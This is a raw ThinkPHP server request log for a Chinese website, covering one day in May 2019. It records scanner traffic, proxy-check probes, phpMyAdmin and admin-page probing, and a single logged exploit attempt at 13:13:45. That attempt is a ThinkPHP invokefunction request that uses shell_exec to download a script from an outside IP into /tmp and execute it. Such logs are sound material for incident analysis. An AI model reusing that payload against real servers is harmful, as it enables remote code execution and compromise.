---------------------------------------------------------------
[2019-05-02T01:46:33+08:00] 107.170.202.18 GET 39.96.87.22/
[运行时间：0.016546s] [吞吐率：60.44req/s] [内存消耗：1,977.11kb] [文件加载：70]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip',
  'accept' => '*/*',
  'user-agent' => 'Mozilla/5.0 zgrab/0.x',
  'host' => '39.96.87.22',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-05-02T01:49:23+08:00] 77.120.95.20 GET 39.96.87.22:80/
[运行时间：0.016139s] [吞吐率：61.96req/s] [内存消耗：1,977.34kb] [文件加载：70]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'content-length' => '0',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7',
  'host' => '39.96.87.22:80',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-05-02T03:26:20+08:00] 47.92.120.136 GET csgxjk.com/
[运行时间：0.016541s] [吞吐率：60.46req/s] [内存消耗：1,977.48kb] [文件加载：70]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
  'host' => 'csgxjk.com',
  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-05-02T03:35:38+08:00] 185.230.41.10 GET 39.96.87.22:80/
[运行时间：0.016346s] [吞吐率：61.18req/s] [内存消耗：1,977.34kb] [文件加载：70]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'content-length' => '0',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
  'host' => '39.96.87.22:80',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-05-02T03:37:50+08:00] 101.132.177.14 GET www.csgxjk.com/
[运行时间：0.016111s] [吞吐率：62.07req/s] [内存消耗：1,977.52kb] [文件加载：70]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
  'host' => 'www.csgxjk.com',
  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-05-02T04:06:28+08:00] 185.137.62.193 GET 39.96.87.22/
[运行时间：0.015959s] [吞吐率：62.66req/s] [内存消耗：1,977.57kb] [文件加载：70]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'cache-control' => 'max-age=0',
  'host' => '39.96.87.22',
  'content-length' => '0',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-05-02T04:07:57+08:00] 159.203.69.138 HEAD 39.96.87.22/
[运行时间：0.016431s] [吞吐率：60.86req/s] [内存消耗：1,977.59kb] [文件加载：70]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'connection' => 'close',
  'accept-language' => 'en-gb,en;q=0.5',
  'accept' => 'text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5',
  'accept-encoding' => 'identity',
  'user-agent' => 'Mozilla/5.0 (compatible; NetcraftSurveyAgent/1.0; +info@netcraft.com)',
  'accept-charset' => 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
  'host' => '39.96.87.22',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-05-02T05:38:45+08:00] 95.213.177.125 POST check.proxyradar.com/azenv.php?auth=155674672509&a=PSCN&i=660625174&p=80
[运行时间：0.014878s] [吞吐率：67.21req/s] [内存消耗：1,724.00kb] [文件加载：67]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
---------------------------------------------------------------
[2019-05-02T05:39:40+08:00] 179.228.90.135 GET 39.96.87.22:80/
[运行时间：0.016615s] [吞吐率：60.19req/s] [内存消耗：1,977.34kb] [文件加载：70]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'content-length' => '0',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
  'host' => '39.96.87.22:80',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-05-02T05:49:31+08:00] 120.72.21.96 GET 39.96.87.22:80/
[运行时间：0.016614s] [吞吐率：60.19req/s] [内存消耗：1,977.34kb] [文件加载：70]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'content-length' => '0',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
  'host' => '39.96.87.22:80',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-05-02T05:54:16+08:00] 36.73.3.224 GET 39.96.87.22:80/
[运行时间：0.016381s] [吞吐率：61.05req/s] [内存消耗：1,977.34kb] [文件加载：70]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'content-length' => '0',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
  'host' => '39.96.87.22:80',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-05-02T06:21:31+08:00] 80.82.70.187 GET www.baidu.com/cache/global/img/gs.gif
[运行时间：0.014953s] [吞吐率：66.88req/s] [内存消耗：1,724.83kb] [文件加载：67]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
---------------------------------------------------------------
[2019-05-02T09:47:01+08:00] 36.81.134.75 GET 39.96.87.22:80/
[运行时间：0.016391s] [吞吐率：61.01req/s] [内存消耗：1,977.34kb] [文件加载：70]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'content-length' => '0',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
  'host' => '39.96.87.22:80',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-05-02T10:11:52+08:00] 80.52.243.42 GET 39.96.87.22:80/
[运行时间：0.016132s] [吞吐率：61.99req/s] [内存消耗：1,977.34kb] [文件加载：70]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'content-length' => '0',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
  'host' => '39.96.87.22:80',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-05-02T10:34:30+08:00] 47.100.104.184 GET 39.96.87.22/
[运行时间：0.017071s] [吞吐率：58.58req/s] [内存消耗：1,977.34kb] [文件加载：70]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
  'host' => '39.96.87.22',
  'user-agent' => 'Mozilla/5.0 (Linux; Android 4.1.1; Nexus 7 Build/JRO03D))',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-05-02T10:42:32+08:00] 54.185.54.186 GET csgxjk.com/
[运行时间：0.016675s] [吞吐率：59.97req/s] [内存消耗：1,976.98kb] [文件加载：70]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip',
  'user-agent' => 'Go-http-client/1.1',
  'host' => 'csgxjk.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-05-02T11:41:32+08:00] 106.14.167.211 GET www.CSGXJK.com/
[运行时间：0.016460s] [吞吐率：60.75req/s] [内存消耗：1,977.33kb] [文件加载：70]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
  'host' => 'www.CSGXJK.com',
  'user-agent' => 'Mozilla/5.0 (Linux; Android 4.1.1; Nexus 7 Build/JRO03D))',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-05-02T12:31:26+08:00] 106.14.168.238 GET www.csgxjk.com/
[运行时间：0.016123s] [吞吐率：62.02req/s] [内存消耗：1,977.33kb] [文件加载：70]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
  'host' => 'www.csgxjk.com',
  'user-agent' => 'Mozilla/5.0 (Linux; Android 4.1.1; Nexus 7 Build/JRO03D))',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-05-02T13:13:45+08:00] 182.92.218.221 GET 39.96.87.22/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=wget%20http://81.6.42.123/a_thk.sh%20-O%20/tmp/a;%20chmod%200777%20/tmp/a;%20/tmp/a;
[运行时间：0.015061s] [吞吐率：66.40req/s] [内存消耗：1,703.10kb] [文件加载：66]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
---------------------------------------------------------------
[2019-05-02T13:26:49+08:00] 103.41.146.176 GET 39.96.87.22:80/
[运行时间：0.016692s] [吞吐率：59.91req/s] [内存消耗：1,977.34kb] [文件加载：70]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'content-length' => '0',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
  'host' => '39.96.87.22:80',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-05-02T13:56:13+08:00] 47.97.216.82 GET csgxjk.com/
[运行时间：0.015692s] [吞吐率：63.73req/s] [内存消耗：1,977.30kb] [文件加载：70]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
  'host' => 'csgxjk.com',
  'user-agent' => 'Mozilla/5.0 (Linux; Android 4.1.1; Nexus 7 Build/JRO03D))',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-05-02T14:02:16+08:00] 95.213.177.126 POST check.proxyradar.com/azenv.php?auth=155677693547&a=PSCN&i=660625174&p=80
[运行时间：0.014246s] [吞吐率：70.20req/s] [内存消耗：1,724.00kb] [文件加载：67]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
---------------------------------------------------------------
[2019-05-02T14:39:24+08:00] 116.255.232.187 GET 39.96.87.22/phpMyAdmin
[运行时间：0.014963s] [吞吐率：66.83req/s] [内存消耗：1,724.96kb] [文件加载：67]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
---------------------------------------------------------------
[2019-05-02T14:39:51+08:00] 116.255.232.187 GET 39.96.87.22/phpMyAdmin
[运行时间：0.015064s] [吞吐率：66.38req/s] [内存消耗：1,724.96kb] [文件加载：67]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
---------------------------------------------------------------
[2019-05-02T14:40:16+08:00] 116.255.232.187 GET 39.96.87.22/phpMyAdmin
[运行时间：0.015127s] [吞吐率：66.11req/s] [内存消耗：1,724.96kb] [文件加载：67]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
---------------------------------------------------------------
[2019-05-02T14:44:34+08:00] 201.220.147.218 GET 39.96.87.22:80/
[运行时间：0.016390s] [吞吐率：61.01req/s] [内存消耗：1,977.34kb] [文件加载：70]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'content-length' => '0',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
  'host' => '39.96.87.22:80',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-05-02T16:09:05+08:00] 177.22.124.82 GET 39.96.87.22:80/
[运行时间：0.016695s] [吞吐率：59.90req/s] [内存消耗：1,977.34kb] [文件加载：70]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'content-length' => '0',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7',
  'host' => '39.96.87.22:80',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-05-02T16:27:47+08:00] 80.82.70.187 GET www.baidu.com/cache/global/img/gs.gif
[运行时间：0.015001s] [吞吐率：66.66req/s] [内存消耗：1,724.83kb] [文件加载：67]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
---------------------------------------------------------------
[2019-05-02T16:46:06+08:00] 139.224.116.230 GET 39.96.87.22/
[运行时间：0.015634s] [吞吐率：63.96req/s] [内存消耗：1,977.34kb] [文件加载：70]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
  'host' => '39.96.87.22',
  'user-agent' => 'Mozilla/5.0 (Linux; Android 4.1.1; Nexus 7 Build/JRO03D))',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-05-02T16:50:52+08:00] 47.97.192.46 GET csgxjk.com/
[运行时间：0.016122s] [吞吐率：62.03req/s] [内存消耗：1,977.30kb] [文件加载：70]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
  'host' => 'csgxjk.com',
  'user-agent' => 'Mozilla/5.0 (Linux; Android 4.1.1; Nexus 7 Build/JRO03D))',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-05-02T17:17:51+08:00] 47.92.4.72 GET www.csgxjk.com/
[运行时间：0.016438s] [吞吐率：60.83req/s] [内存消耗：1,977.33kb] [文件加载：70]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
  'host' => 'www.csgxjk.com',
  'user-agent' => 'Mozilla/5.0 (Linux; Android 4.1.1; Nexus 7 Build/JRO03D))',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-05-02T17:50:26+08:00] 47.92.50.96 GET csgxjk.com/
[运行时间：0.016404s] [吞吐率：60.96req/s] [内存消耗：1,977.48kb] [文件加载：70]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
  'host' => 'csgxjk.com',
  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-05-02T17:50:35+08:00] 47.92.137.155 GET csgxjk.com/admin/dashboard/welcome.html
[运行时间：0.018054s] [吞吐率：55.39req/s] [内存消耗：2,138.28kb] [文件加载：81]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
  'host' => 'csgxjk.com',
  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-05-02T17:50:35+08:00] 47.92.137.155 GET csgxjk.com/admin/login/index.html
[运行时间：0.017694s] [吞吐率：56.52req/s] [内存消耗：2,142.65kb] [文件加载：82]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
  'host' => 'csgxjk.com',
  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/csgx2/application/admin/view/login_index.php [ array (
) ]
---------------------------------------------------------------
[2019-05-02T17:57:52+08:00] 46.229.205.16 GET 39.96.87.22:80/
[运行时间：0.016958s] [吞吐率：58.97req/s] [内存消耗：1,977.34kb] [文件加载：70]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'content-length' => '0',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
  'host' => '39.96.87.22:80',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-05-02T18:06:35+08:00] 47.92.71.118 GET csgxjk.com/admin/menu/index.html
[运行时间：0.018085s] [吞吐率：55.29req/s] [内存消耗：2,134.49kb] [文件加载：81]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
  'host' => 'csgxjk.com',
  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-05-02T18:06:35+08:00] 47.92.71.118 GET csgxjk.com/admin/login/index.html
[运行时间：0.017577s] [吞吐率：56.89req/s] [内存消耗：2,142.65kb] [文件加载：82]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
  'host' => 'csgxjk.com',
  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/csgx2/application/admin/view/login_index.php [ array (
) ]
---------------------------------------------------------------
[2019-05-02T18:10:14+08:00] 101.132.156.172 GET csgxjk.com/admin/login/admin.html
[运行时间：0.018004s] [吞吐率：55.54req/s] [内存消耗：2,127.41kb] [文件加载：80]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
  'host' => 'csgxjk.com',
  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-05-02T18:10:14+08:00] 101.132.156.172 GET csgxjk.com/admin/login/index.html
[运行时间：0.018838s] [吞吐率：53.08req/s] [内存消耗：2,142.65kb] [文件加载：82]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
  'host' => 'csgxjk.com',
  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/csgx2/application/admin/view/login_index.php [ array (
) ]
---------------------------------------------------------------
[2019-05-02T18:17:18+08:00] 106.14.189.11 GET csgxjk.com/admin/login/index.html
[运行时间：0.018860s] [吞吐率：53.02req/s] [内存消耗：2,142.65kb] [文件加载：82]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
  'host' => 'csgxjk.com',
  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/csgx2/application/admin/view/login_index.php [ array (
) ]
---------------------------------------------------------------
[2019-05-02T18:35:41+08:00] 47.92.146.203 GET csgxjk.com/admin/index/index.html
[运行时间：0.018963s] [吞吐率：52.73req/s] [内存消耗：2,149.56kb] [文件加载：83]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
  'host' => 'csgxjk.com',
  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/csgx2/application/admin/view/index_index.php [ array (
  0 => 'userinfo',
  1 => 'menu',
) ]
---------------------------------------------------------------
[2019-05-02T18:48:12+08:00] 47.92.146.203 GET 39.96.87.22//
[运行时间：0.016311s] [吞吐率：61.31req/s] [内存消耗：1,977.52kb] [文件加载：70]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
  'host' => '39.96.87.22',
  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-05-02T19:07:56+08:00] 191.19.46.226 GET 39.96.87.22:80/
[运行时间：0.017975s] [吞吐率：55.63req/s] [内存消耗：1,977.34kb] [文件加载：70]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'content-length' => '0',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
  'host' => '39.96.87.22:80',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-05-02T19:07:56+08:00] 191.19.46.226 GET 39.96.87.22:80/
[运行时间：0.016225s] [吞吐率：61.63req/s] [内存消耗：1,977.34kb] [文件加载：70]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'content-length' => '0',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
  'host' => '39.96.87.22:80',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-05-02T19:09:11+08:00] 47.97.216.82 GET csgxjk.com/admin/admin/index.html
[运行时间：0.018146s] [吞吐率：55.11req/s] [内存消耗：2,144.14kb] [文件加载：81]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
  'host' => 'csgxjk.com',
  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-05-02T19:09:11+08:00] 47.97.216.82 GET csgxjk.com/admin/login/index.html
[运行时间：0.017889s] [吞吐率：55.90req/s] [内存消耗：2,142.65kb] [文件加载：82]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
  'host' => 'csgxjk.com',
  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/csgx2/application/admin/view/login_index.php [ array (
) ]
---------------------------------------------------------------
[2019-05-02T19:50:26+08:00] 52.83.105.19 GET 39.96.87.22/
[运行时间：0.016648s] [吞吐率：60.07req/s] [内存消耗：1,977.12kb] [文件加载：70]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip',
  'accept' => '*/*',
  'user-agent' => 'Mozilla/5.0 zgrab/0.x',
  'host' => '39.96.87.22',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-05-02T21:26:28+08:00] 128.14.209.178 GET 39.96.87.22/nx8j78af1b.jsp
[运行时间：0.014856s] [吞吐率：67.31req/s] [内存消耗：1,724.85kb] [文件加载：67]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
---------------------------------------------------------------
[2019-05-02T21:39:49+08:00] 152.254.243.97 GET 39.96.87.22:80/
